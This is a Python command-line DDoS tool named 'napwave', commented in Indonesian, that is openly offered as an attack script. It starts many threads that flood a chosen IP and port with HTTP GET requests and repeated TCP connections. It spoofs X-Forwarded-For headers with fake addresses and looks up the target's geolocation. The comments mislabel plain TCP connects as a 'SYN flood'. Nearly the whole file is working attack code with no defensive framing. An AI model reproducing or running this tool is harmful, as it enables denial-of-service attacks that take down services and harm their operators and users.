#!/usr/bin/env python3

import threading
import socket
import argparse
import logging
import random
import time
import signal
import requests
from colorama import init, Fore, Style

# Inisialisasi colorama untuk warna teks di terminal
init(autoreset=True)

# Pengaturan logging
logging.basicConfig(level=logging.INFO, format=f"{Fore.WHITE}%(asctime)s{Style.RESET_ALL} - %(levelname)s - %(message)s")

connection_counter = 0
lock = threading.Lock()
terminate = False

# Daftar IP palsu
fake_ips = ['192.168.1.1', '192.168.1.2', '192.168.1.3', '192.168.1.4']

def signal_handler(sig, frame):
    global terminate
    if terminate:
        print(f"{Fore.RED}Menghentikan program secara paksa...{Style.RESET_ALL}")
        exit(0)
    print(f"{Fore.CYAN}Selesai.{Style.RESET_ALL}")
    terminate = True

signal.signal(signal.SIGINT, signal_handler)

# Fungsi untuk mendapatkan geolokasi target menggunakan ip-api.com
def get_geolocation(ip_address):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        data = response.json()
        if data['status'] == 'success':
            print(f"{Fore.LIGHTBLACK_EX}Geolokasi Target:{Style.RESET_ALL}")
            print(f"{Fore.LIGHTBLACK_EX}IP:{Style.RESET_ALL} {data['query']}")
            print(f"{Fore.LIGHTBLACK_EX}Negara:{Style.RESET_ALL} {data['country']}")
            print(f"{Fore.LIGHTBLACK_EX}Kota:{Style.RESET_ALL} {data['city']}")
            print(f"{Fore.LIGHTBLACK_EX}ISP:{Style.RESET_ALL} {data['isp']}")
            print(f"{Fore.LIGHTBLACK_EX}Zona Waktu:{Style.RESET_ALL} {data['timezone']}")
        else:
            print(f"{Fore.RED}Gagal mendapatkan geolokasi untuk IP {ip_address}{Style.RESET_ALL}")
    except requests.RequestException as e:
        print(f"{Fore.RED}Error saat mengakses API geolokasi: {e}{Style.RESET_ALL}")

class Ddos(threading.Thread):
    def __init__(self, target_ip, http_port, fake_ip):
        super().__init__()
        self.target_ip = target_ip
        self.http_port = http_port
        self.fake_ip = fake_ip

    def bypass(self):
        return random.choice(fake_ips)

    def ddos(self):
        global connection_counter
        while not terminate:
            try:
                # Layer 7 HTTP GET Flood
                new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                new_socket.settimeout(0.5)
                new_socket.connect((self.target_ip, self.http_port))

                headers = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n"
                headers += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n"
                headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n"
                headers += "Accept-Encoding: gzip, deflate\r\n"
                headers += f"X-Forwarded-For: {self.bypass()}\r\n"
                headers += "Connection: keep-alive\r\n\r\n"

                new_socket.sendall(headers.encode('ascii'))
                new_socket.close()

                with lock:
                    connection_counter += 1
                    if connection_counter % 500 == 0:
                        logging.info(f"{Fore.CYAN}Total koneksi (HTTP GET Flood): {connection_counter}{Style.RESET_ALL}")

                time.sleep(random.uniform(0.1, 0.5))

            except socket.error:
                logging.error(f"{Fore.RED}Koneksi HTTP GET gagal ke {self.target_ip}:{self.http_port}{Style.RESET_ALL}")

    def tcp_flood(self):
        global connection_counter
        while not terminate:
            try:
                # Layer 4 TCP SYN Flood
                new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                new_socket.connect((self.target_ip, self.http_port))
                new_socket.close()

                with lock:
                    connection_counter += 1
                    if connection_counter % 500 == 0:
                        logging.info(f"{Fore.MAGENTA}Total koneksi (TCP SYN Flood): {connection_counter}{Style.RESET_ALL}")

                time.sleep(random.uniform(0.1, 0.5))

            except socket.error:
                logging.error(f"{Fore.RED}Koneksi TCP gagal ke {self.target_ip}:{self.http_port}{Style.RESET_ALL}")

    def hybrid_attack(self):
        """ Hybrid method that randomly switches between HTTP GET and TCP SYN flood """
        if random.choice([True, False]):
            self.ddos()
        else:
            self.tcp_flood()

    def run(self):
        while not terminate:
            self.hybrid_attack()

def main():
    parser = argparse.ArgumentParser(description=f"{Fore.CYAN}napwave the DDos attack{Style.RESET_ALL}", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-IP", "--target_ip", type=str, required=True, help="IP target")
    parser.add_argument("-p", "--http_port", type=int, required=True, help="Port target")
    parser.add_argument("-F", "--fake_ip", type=str, required=True, help="IP palsu")
    parser.add_argument("-t", "--num_threads", type=int, required=True, help="Jumlah thread")

    args = parser.parse_args()

    print(f"{Fore.CYAN}napwave attack...{Style.RESET_ALL}")

    # Panggil fungsi geolokasi untuk menampilkan info target
    get_geolocation(args.target_ip)

    threads = []
    for _ in range(args.num_threads):
        thread = Ddos(args.target_ip, args.http_port, args.fake_ip)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
